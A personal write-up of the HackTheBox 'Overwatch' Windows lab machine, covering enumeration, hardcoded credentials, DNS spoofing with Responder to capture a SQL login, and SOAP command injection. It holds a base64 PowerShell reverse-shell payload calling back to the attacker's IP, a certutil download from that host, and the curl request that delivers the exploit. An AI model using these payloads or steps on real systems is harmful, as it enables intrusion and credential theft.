---
title: Overwatch Machine Writeup
date: 2026-05-11 
categories: [HackTheBox, Windows]
tags: [htb, ctf, AD]
image: /assets/img/overwatch/banner.png
description: Full walkthrough of the Overwatch HTB machine.
---
OverWatch 

Windows medium Machine 

>[!Mistake]
>- I didn't run full port scan (--min-rate -p-). 
>- When i see the exe, I just download it, but i  missed the config files.
>- While decompile the .exe files. Once i found password forgot to read code
>- Use always use debug mode in tools


Initial Nmap scan

```Bash
nmap -sCV 10.129.244.81 -Pn                                                                                                                       [17:53:54]
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-07 17:55 IST
Nmap scan report for 10.129.244.81
Host is up (0.084s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-07 12:25:46Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: overwatch.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: overwatch.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=S200401.overwatch.htb
| Not valid before: 2025-12-07T15:16:06
|_Not valid after:  2026-06-08T15:16:06
|_ssl-date: 2026-05-07T12:26:33+00:00; -1s from scanner time.
| rdp-ntlm-info:
|   Target_Name: OVERWATCH
|   NetBIOS_Domain_Name: OVERWATCH
|   NetBIOS_Computer_Name: S200401
|   DNS_Domain_Name: overwatch.htb
|   DNS_Computer_Name: S200401.overwatch.htb
|   DNS_Tree_Name: overwatch.htb
|   Product_Version: 10.0.20348
|_  System_Time: 2026-05-07T12:25:54+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: S200401; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-05-07T12:25:54
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.72 seconds
```

After the scan ,do smb enumeration  using nxc

```
nxc smb 10.129.244.81 -u '' -p ''                                                                                                                 [18:05:27]
SMB         10.129.244.81   445    S200401          [*] Windows Server 2022 Build 20348 x64 (name:S200401) (domain:overwatch.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.244.81   445    S200401          [+] overwatch.htb\:
```

Even without username password smb login possible but we can't list shares

```
nxc smb 10.129.244.81 -u '' -p '' --shares                                                                                                        [18:08:20]
SMB         10.129.244.81   445    S200401          [*] Windows Server 2022 Build 20348 x64 (name:S200401) (domain:overwatch.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.244.81   445    S200401          [+] overwatch.htb\:
SMB         10.129.244.81   445    S200401          [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

With default guest username shares are listed successfully.

```
nxc smb 10.129.244.81 -u 'guest' -p '' --shares                                                                                                   [18:08:37]
SMB         10.129.244.81   445    S200401          [*] Windows Server 2022 Build 20348 x64 (name:S200401) (domain:overwatch.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.244.81   445    S200401          [+] overwatch.htb\guest:
SMB         10.129.244.81   445    S200401          [*] Enumerated shares
SMB         10.129.244.81   445    S200401          Share           Permissions     Remark
SMB         10.129.244.81   445    S200401          -----           -----------     ------
SMB         10.129.244.81   445    S200401          ADMIN$                          Remote Admin
SMB         10.129.244.81   445    S200401          C$                              Default share
SMB         10.129.244.81   445    S200401          IPC$            READ            Remote IPC
SMB         10.129.244.81   445    S200401          NETLOGON                        Logon server share
SMB         10.129.244.81   445    S200401          software$       READ
SMB         10.129.244.81   445    S200401          SYSVOL                          Logon server share
```

After listed the smb shares, only one is not  a common share so spider the <span style="color:rgb(0, 176, 240)">software$</span> share with pattern

```Bash
nxc smb 10.129.244.81 -u 'guest' -p '' --spider software$ --pattern .                                                           [18:13:01]
SMB         10.129.244.81   445    S200401          [*] Windows Server 2022 Build 20348 x64 (name:S200401) (domain:overwatch.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.244.81   445    S200401          [+] overwatch.htb\guest:
SMB         10.129.244.81   445    S200401          [*] Spidering .
SMB         10.129.244.81   445    S200401          //10.129.244.81/software$/. [dir]
SMB         10.129.244.81   445    S200401          //10.129.244.81/software$/.. [dir]
SMB         10.129.244.81   445    S200401          //10.129.244.81/software$/Monitoring/. [dir]
SMB         10.129.244.81   445    S200401          //10.129.244.81/software$/Monitoring/.. [dir]
SMB         10.129.244.81   445    S200401          //10.129.244.81/software$/Monitoring/EntityFramework.dll [lastm:'2026-01-06 16:55' size:4991352]
SMB         10.129.244.81   445    S200401          //10.129.244.81/software$/Monitoring/EntityFramework.SqlServer.dll [lastm:'2026-01-06 16:55' size:591752]
SMB         10.129.244.81   445    S200401          //10.129.244.81/software$/Monitoring/EntityFramework.SqlServer.xml [lastm:'2026-01-06 16:55' size:163193]
SMB         10.129.244.81   445    S200401          //10.129.244.81/software$/Monitoring/EntityFramework.xml [lastm:'2026-01-06 16:55' size:3738289]
SMB         10.129.244.81   445    S200401          //10.129.244.81/software$/Monitoring/Microsoft.Management.Infrastructure.dll [lastm:'2026-01-06 16:55' size:36864]
SMB         10.129.244.81   445    S200401          //10.129.244.81/software$/Monitoring/overwatch.exe [lastm:'2026-01-06 16:55' size:9728]
SMB         10.129.244.81   445    S200401          //10.129.244.81/software$/Monitoring/overwatch.exe.config [lastm:'2026-01-06 16:55' size:2163]
SMB         10.129.244.81   445    S200401          //10.129.244.81/software$/Monitoring/overwatch.pdb [lastm:'2026-01-06 16:55' size:30208]
SMB         10.129.244.81   445    S200401          //10.129.244.81/software$/Monitoring/System.Data.SQLite.dll [lastm:'2026-01-06 16:55' size:450232]
SMB         10.129.244.81   445    S200401          //10.129.244.81/software$/Monitoring/System.Data.SQLite.EF6.dll [lastm:'2026-01-06 16:55' size:206520]
SMB         10.129.244.81   445    S200401          //10.129.244.81/software$/Monitoring/System.Data.SQLite.Linq.dll [lastm:'2026-01-06 16:55' size:206520]
SMB         10.129.244.81   445    S200401          //10.129.244.81/software$/Monitoring/System.Data.SQLite.xml [lastm:'2026-01-06 16:55' size:1245480]
SMB         10.129.244.81   445    S200401          //10.129.244.81/software$/Monitoring/System.Management.Automation.dll [lastm:'2026-01-06 16:55' size:360448]
SMB         10.129.244.81   445    S200401          //10.129.244.81/software$/Monitoring/System.Management.Automation.xml [lastm:'2026-01-06 16:55' size:7145771]
SMB         10.129.244.81   445    S200401          //10.129.244.81/software$/Monitoring/x64/. [dir]
SMB         10.129.244.81   445    S200401          //10.129.244.81/software$/Monitoring/x64/.. [dir]
SMB         10.129.244.81   445    S200401          //10.129.244.81/software$/Monitoring/x64/SQLite.Interop.dll [lastm:'2026-01-06 16:55' size:2005688]
SMB         10.129.244.81   445    S200401          //10.129.244.81/software$/Monitoring/x86/. [dir]
SMB         10.129.244.81   445    S200401          //10.129.244.81/software$/Monitoring/x86/.. [dir]
SMB         10.129.244.81   445    S200401          //10.129.244.81/software$/Monitoring/x86/SQLite.Interop.dll [lastm:'2026-01-06 16:55' size:1592504]
```

Inside the share <span style="color:rgb(0, 255, 0)">overwatch.exe</span> and <span style="color:rgb(0, 255, 0)">overwatch.exe.config</span> is there, Download and decompile it using ILspy.

>[!what i did wrong]
>In this section i have downloaded exe only ,i missed config file which is helped in Privilege escalation

```Bash
nxc smb 10.129.244.81 -u 'guest' -p '' --share software$ --get-file 'Monitoring/overwatch.exe' ~/hackthebox/overwatch/overwatch.exe
SMB         10.129.244.81   445    S200401          [*] Windows Server 2022 Build 20348 x64 (name:S200401) (domain:overwatch.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.244.81   445    S200401          [+] overwatch.htb\guest:
SMB         10.129.244.81   445    S200401          [*] Copying "Monitoring/overwatch.exe" to "/home/orca/hackthebox/overwatch/overwatch.exe"
SMB         10.129.244.81   445    S200401          [+] File "Monitoring/overwatch.exe" was downloaded to "/home/orca/hackthebox/overwatch/overwatch.exe"
```

After download the exe decompile using ILSPY tool

- run ILspy binary
- Upload the overwatch.exe
- In source code ,you will find hardcoded credentials
![Enumeration Screenshot](/assets/img/overwatch/1.png)
<span style="color:rgb(255, 255, 0)">username - sqlsvc<br>Password - TI0LKcfHzZw1Vv </span>

>[!What I Did Wrong]
>I didn't read or understand the code Because there is vulnerability  which is used in Privilege escalation

Just check credentials with smb,winrm and mssql

<span style="color:rgb(255, 0, 0)">Here, i have did big mistake, even i didn't scan full port.i missed the one port which main foothold </span>

```bash
nmap --min-rate 10000 -p- 10.129.244.81 -Pn                                                                                                   [18:37:40]
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-07 18:38 IST
Nmap scan report for overwatch.htb (10.129.244.81)
Host is up (0.073s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3389/tcp  open  ms-wbt-server
6520/tcp  open  unknown
9389/tcp  open  adws
49664/tcp open  unknown
49668/tcp open  unknown
52651/tcp open  unknown
57445/tcp open  unknown
57446/tcp open  unknown
57452/tcp open  unknown
62408/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 23.54 seconds
```

I have logged into mssql using Impacket-mssqlclient

```bash
impacket-mssqlclient overwatch.htb/sqlsvc:'TI0LKcfHzZw1Vv'@10.129.244.81 -port 6520 -windows-auth                                               [18:49:06]
Impacket v0.14.0.dev0+20260421.100208.c9456e95 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(S200401\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(S200401\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (OVERWATCH\sqlsvc  guest@master)> use overwatch
ENVCHANGE(DATABASE): Old Value: master, New Value: overwatch
INFO(S200401\SQLEXPRESS): Line 1: Changed database context to 'overwatch'.
SQL (OVERWATCH\sqlsvc  dbo@overwatch)> select overwatch from sys.tables;
ERROR(S200401\SQLEXPRESS): Line 1: Invalid column name 'overwatch'.
SQL (OVERWATCH\sqlsvc  dbo@overwatch)> select name from sys.tables;
name
--------
Eventlog
SQL (OVERWATCH\sqlsvc  dbo@overwatch)> select * from eventlog
Id   Timestamp   EventType   Details
--   ---------   ---------   -------
SQL (OVERWATCH\sqlsvc  dbo@overwatch)>
```

No Interesting data inside the mssql Tables, so i enumerate with options 

```Bash
SQL (OVERWATCH\sqlsvc  dbo@overwatch)> enum_impersonate
execute as   database   permission_name   state_desc   grantee   grantor
----------   --------   ---------------   ----------   -------   -------
SQL (OVERWATCH\sqlsvc  dbo@overwatch)> enable_xp_cmdshell
ERROR(S200401\SQLEXPRESS): Line 105: User does not have permission to perform this action.
ERROR(S200401\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.
ERROR(S200401\SQLEXPRESS): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
ERROR(S200401\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.
SQL (OVERWATCH\sqlsvc  dbo@overwatch)> enum_users
UserName             RoleName   LoginName          DefDBName   DefSchemaName       UserID                                                           SID
------------------   --------   ----------------   ---------   -------------   ----------   -----------------------------------------------------------
dbo                  db_owner   OVERWATCH\sqlsvc   master      dbo             b'1         '   b'01050000000000051500000002d9b7a6b0b75e51f445f10d50040000'
guest                public     NULL               NULL        guest           b'2         '                                                         b'00'
INFORMATION_SCHEMA   public     NULL               NULL        NULL            b'3         '                                                          NULL
sys                  public     NULL               NULL        NULL            b'4         '                                                          NULL
SQL (OVERWATCH\sqlsvc  dbo@overwatch)> enum_links
SRV_NAME             SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE       SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT
------------------   ----------------   -----------   ------------------   ------------------   ------------   -------
S200401\SQLEXPRESS   SQLNCLI            SQL Server    S200401\SQLEXPRESS   NULL                 NULL           NULL
SQL07                SQLNCLI            SQL Server    SQL07                NULL                 NULL           NULL
Linked Server   Local Login   Is Self Mapping   Remote Login
-------------   -----------   ---------------   ------------
```

Here i stucked After sometimes with help of @4ntsec i found links server concept and found one linked server. but that is  not reachable.

```Bash
SQL (OVERWATCH\sqlsvc  guest@master)> SELECT * FROM OPENQUERY(SQL07, 'SELECT name FROM master..sysdatabases');
INFO(S200401\SQLEXPRESS): Line 1: OLE DB provider "MSOLEDBSQL" for linked server "SQL07" returned message "Login timeout expired".
INFO(S200401\SQLEXPRESS): Line 1: OLE DB provider "MSOLEDBSQL" for linked server "SQL07" returned message "A network-related or instance-specific error has occurred while establishing a connection to SQL Server. Server is not found or not accessible. Check if instance name is correct and if SQL Server is configured to allow remote connections. For more information see SQL Server Books Online.".
ERROR(MSOLEDBSQL): Line 0: Named Pipes Provider: Could not open a connection to SQL Server [53].
```

The Linked server response timeout due to<span style="color:rgb(0, 176, 240)"> DNS not assigned</span>. Another concept add DNS for this server with your ip using dnstool

[Dnstool git repo](https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py) -- clone this repo and run this tool within the dir

```Bash
orca:krbrelayx/ (master) $ python3 dnstool.py -u overwatch.htb\\sqlsvc -p 'TI0LKcfHzZw1Vv' --action add --record SQL07 --data 10.10.17.2 -dns-ip 10.129.244.81 overwatch.htb
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

- Also run responder to capture the password while trigger the server.
`sudo responder -I tun0 -dwv`

| Option      | Meaning                                                                                       |
| ----------- | --------------------------------------------------------------------------------------------- |
| `sudo`      | Run as root/admin (required for packet capture and spoofing)                                  |
| `responder` | Launch the Responder tool                                                                     |
| `-I tun0`   | Listen on interface `tun0` (usually a VPN/tunnel interface like HackTheBox/TryHackMe/OpenVPN) |
| `-d`        | Enable DHCP poisoning responses                                                               |
| `-w`        | Start WPAD rogue proxy server attacks                                                         |
| `-v`        | Verbose mode (more detailed output)                                                           |
When trigger the Linked server

Trigger
```Bash
SQL (OVERWATCH\sqlsvc  guest@master)> SELECT * FROM OPENQUERY(SQL07, 'SELECT name FROM master..sysdatabases');
INFO(S200401\SQLEXPRESS): Line 1: OLE DB provider "MSOLEDBSQL" for linked server "SQL07" returned message "Communication link failure".
ERROR(MSOLEDBSQL): Line 0: TCP Provider: An existing connection was forcibly closed by the remote host.
```

Capture Password

```bash
[+] Listening for events...

[MSSQL] Received connection from 10.129.244.81
[MSSQL] Cleartext Client   : 10.129.244.81
[MSSQL] Cleartext Hostname : SQL07 ()
[MSSQL] Cleartext Username : sqlmgmt
[MSSQL] Cleartext Password : bIhBbzMMnB82yx
```
``
After Got credential try with all service using nxc

>[!What I Did Wrong]
>sometimes timeout due to machine problem,i checked with only evil-winrm ,I didn'i check with nxc with --timeout and --debug options

```bash
orca:writeup/ $ nxc winrm 10.129.244.81 -u sqlmgmt -p 'bIhBbzMMnB82yx'                                                                                          [19:43:19]
WINRM       10.129.244.81   5985   S200401          [*] Windows Server 2022 Build 20348 (name:S200401) (domain:overwatch.htb)
WINRM       10.129.244.81   5985   S200401          [+] overwatch.htb\sqlmgmt:bIhBbzMMnB82yx (Pwn3d!)
```

<span style="color:rgb(0, 255, 0)">User Flag</span>

```Bash
orca:writeup/ $ evil-winrm -i 10.129.244.81  -u sqlmgmt -p 'bIhBbzMMnB82yx'                                                                                     [19:46:49]

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\sqlmgmt\Documents> type ../Desktop/user.txt
9e4c385671ef8215**********
```

---
Enumeration 

- Find local port
- In overwatch.exe, found command injection vulnerability
- Also config file got port and services
- Run the lingolo and exploit

```Bash
*Evil-WinRM* PS C:\Users\sqlmgmt\Documents> netstat -ano | findstr LISTENING
TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       696
TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       936
TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       696
TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       696
TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       936
TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       696
TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       696
TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       696
TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       384
TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
TCP    0.0.0.0:6520           0.0.0.0:0              LISTENING       6132
TCP    0.0.0.0:8000           0.0.0.0:0              LISTENING       4
TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       2924
TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       696
TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       548
TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1232
TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1692
TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       696
TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING       2092
TCP    0.0.0.0:53314          0.0.0.0:0              LISTENING       2476
TCP    0.0.0.0:56084          0.0.0.0:0              LISTENING       6132
TCP    0.0.0.0:57445          0.0.0.0:0              LISTENING       696
TCP    0.0.0.0:57446          0.0.0.0:0              LISTENING       2880
TCP    0.0.0.0:57449          0.0.0.0:0              LISTENING       680
TCP    0.0.0.0:57452          0.0.0.0:0              LISTENING       696
TCP    0.0.0.0:62408          0.0.0.0:0              LISTENING       3000
TCP    10.129.244.81:53       0.0.0.0:0              LISTENING       2476
TCP    10.129.244.81:139      0.0.0.0:0              LISTENING       4
TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       2476
TCP    [::]:88                [::]:0                 LISTENING       696
TCP    [::]:135               [::]:0                 LISTENING       936
TCP    [::]:389               [::]:0                 LISTENING       696
TCP    [::]:445               [::]:0                 LISTENING       4
TCP    [::]:464               [::]:0                 LISTENING       696
TCP    [::]:593               [::]:0                 LISTENING       936
TCP    [::]:636               [::]:0                 LISTENING       696
TCP    [::]:3268              [::]:0                 LISTENING       696
TCP    [::]:3269              [::]:0                 LISTENING       696
TCP    [::]:3389              [::]:0                 LISTENING       384
TCP    [::]:5985              [::]:0                 LISTENING       4
TCP    [::]:6520              [::]:0                 LISTENING       6132
TCP    [::]:8000              [::]:0                 LISTENING       4
TCP    [::]:9389              [::]:0                 LISTENING       2924
TCP    [::]:47001             [::]:0                 LISTENING       4
TCP    [::]:49664             [::]:0                 LISTENING       696
TCP    [::]:49665             [::]:0                 LISTENING       548
TCP    [::]:49666             [::]:0                 LISTENING       1232
TCP    [::]:49667             [::]:0                 LISTENING       1692
TCP    [::]:49668             [::]:0                 LISTENING       696
TCP    [::]:49670             [::]:0                 LISTENING       2092
TCP    [::]:53314             [::]:0                 LISTENING       2476
TCP    [::]:56084             [::]:0                 LISTENING       6132
TCP    [::]:57445             [::]:0                 LISTENING       696
TCP    [::]:57446             [::]:0                 LISTENING       2880
TCP    [::]:57449             [::]:0                 LISTENING       680
TCP    [::]:57452             [::]:0                 LISTENING       696
TCP    [::]:62408             [::]:0                 LISTENING       3000
TCP    [::1]:53               [::]:0                 LISTENING       2476
TCP    [dead:beef::9e]:53     [::]:0                 LISTENING       2476
TCP    [dead:beef::95e4:b958:f0f0:2f72]:53  [::]:0                 LISTENING       2476
TCP    [fe80::6934:6051:1add:74d7%3]:53  [::]:0                 LISTENING       2476
```


Found command injection in overwatch.exe.

Command injection - this program kill the process using the user input (process name) without proper sanitization. 

```bash
// MonitoringService
using System;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Text;

public string KillProcess(string processName)
{
string text = "Stop-Process -Name " + processName + " -Force";
try
{
Runspace val = RunspaceFactory.CreateRunspace();
try
{
val.Open();
Pipeline val2 = val.CreatePipeline();
try
{
val2.get_Commands().AddScript(text);
val2.get_Commands().Add("Out-String");
Collection<PSObject> collection = val2.Invoke();
val.Close();
StringBuilder stringBuilder = new StringBuilder();
foreach (PSObject item in collection)
{
stringBuilder.AppendLine(((object)item).ToString());
}
return stringBuilder.ToString();
}
finally
{
((IDisposable)val2)?.Dispose();
}
}
finally
{
((IDisposable)val)?.Dispose();
}
}
catch (Exception ex)
{
return "Error: " + ex.Message;
}
}
```

Found  local port with directory name in overwatch.exe.config --> http://overwatch.htb:8000/MonitorService

```Bash
orca:overwatch/ $ cat overwatch.exe.config                                                                                                                      [19:54:06]
<?xml version="1.0" encoding="utf-8"?>
<configuration>
<configSections>
<!-- For more information on Entity Framework configuration, visit http://go.microsoft.com/fwlink/?LinkID=237468 -->
<section name="entityFramework" type="System.Data.Entity.Internal.ConfigFile.EntityFrameworkSection, EntityFramework, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" requirePermission="false" />
</configSections>
<system.serviceModel>
<services>
<service name="MonitoringService">
<host>
<baseAddresses>
<add baseAddress="http://overwatch.htb:8000/MonitorService" />
</baseAddresses>
</host>
<endpoint address="" binding="basicHttpBinding" contract="IMonitoringService" />
<endpoint address="mex" binding="mexHttpBinding" contract="IMetadataExchange" />
</service>
</services>
<behaviors>
<serviceBehaviors>
<behavior>
<serviceMetadata httpGetEnabled="True" />
<serviceDebug includeExceptionDetailInFaults="True" />
</behavior>
</serviceBehaviors>
</behaviors>
</system.serviceModel>
<entityFramework>
<providers>
<provider invariantName="System.Data.SqlClient" type="System.Data.Entity.SqlServer.SqlProviderServices, EntityFramework.SqlServer" />
<provider invariantName="System.Data.SQLite.EF6" type="System.Data.SQLite.EF6.SQLiteProviderServices, System.Data.SQLite.EF6" />
</providers>
</entityFramework>
<system.data>
<DbProviderFactories>
<remove invariant="System.Data.SQLite.EF6" />
<add name="SQLite Data Provider (Entity Framework 6)" invariant="System.Data.SQLite.EF6" description=".NET Framework Data Provider for SQLite (Entity Framework 6)" type="System.Data.SQLite.EF6.SQLiteProviderFactory, System.Data.SQLite.EF6" />
<remove invariant="System.Data.SQLite" /><add name="SQLite Data Provider" invariant="System.Data.SQLite" description=".NET Framework Data Provider for SQLite" type="System.Data.SQLite.SQLiteFactory, System.Data.SQLite" /></DbProviderFactories>
</system.data>
</configuration>%                                                                                                                                               
```


Run Ligolo-ng #ligolo-ng

- Download Ligolo agent and proxy [ligolo](``` wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_proxy_linux_amd64.tar.gz ```)
- Transfer agent file using wget or any tranfer method in windows
- run python server and transfer
```bash
*Evil-WinRM* PS C:\Users\sqlmgmt\Documents> certutil -urlcache -f -split http://10.10.17.2:8000/agent.exe
****  Online  ****
000000  ...
662600
CertUtil: -URLCache command completed successfully.
*Evil-WinRM* PS C:\Users\sqlmgmt\Documents> ls


Directory: C:\Users\sqlmgmt\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          5/7/2026   7:40 AM        6694400 agent.exe
```
- Route ip 
```bash
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
```
- Run the proxy in linux
`sudo ./proxy -selfcert

- Run the agent in windows
`.\agent.exe -connect YOUR-IP:11601 -ignore-cert`

```bash
*Evil-WinRM* PS C:\Users\sqlmgmt\Documents> certutil -urlcache -f -split http://10.10.17.2:8000/agent.exe
****  Online  ****
000000  ...
662600
CertUtil: -URLCache command completed successfully.
*Evil-WinRM* PS C:\Users\sqlmgmt\Documents> ls


Directory: C:\Users\sqlmgmt\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          5/7/2026   7:40 AM        6694400 agent.exe
```
- In attacker machine ligolo 
	 type  ----> session
		select session by number ----> 1
			then type ---> start 
				connection established 
- To access target machine local port use this
`sudo ip route add 240.0.0.1/32 dev ligolo`

- At last Check internal portal accessible or not
`nmap 240.0.0.1 -sV -Pn`

atlast access the internal port service in browser and find wsdl -- soap api document

found exploit path

![Enumeration Screenshot](/assets/img/overwatch/2.png)


![Enumeration Screenshot](/assets/img/overwatch/3.png)

Write exploit with help of chatgpt

Payload --(revershell with base64)

```xml 
<?xml version="1.0" encoding="utf-8"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
<s:Body>
<KillProcess xmlns="http://tempuri.org/">
<processName>test; powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA3AC4AMgAiACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA= # </processName>
</KillProcess>
</s:Body>
</s:Envelope>
```


Run Listener
`nc -lvnp 4444`

Run exploit

```bash
curl -X POST http://240.0.0.1:8000/MonitorService \
-H "Content-Type: text/xml;charset=UTF-8" \
-H "SOAPAction: \"http://tempuri.org/IMonitoringService/KillProcess\"" \
-d @req.xml -v
```

with -v  you will see what will happen.

Finally Got reverse shell
```Bash
orca:writeup/ $ nc -lvnp 4444                                                                                                                                   [20:35:37]
Listening on 0.0.0.0 4444
Connection received on 10.129.244.81 61125

PS C:\Software\Monitoring> type ../../Users/Administrator/Desktop/root.txt
f1ee70c60d50a89ce62e**********
```

---
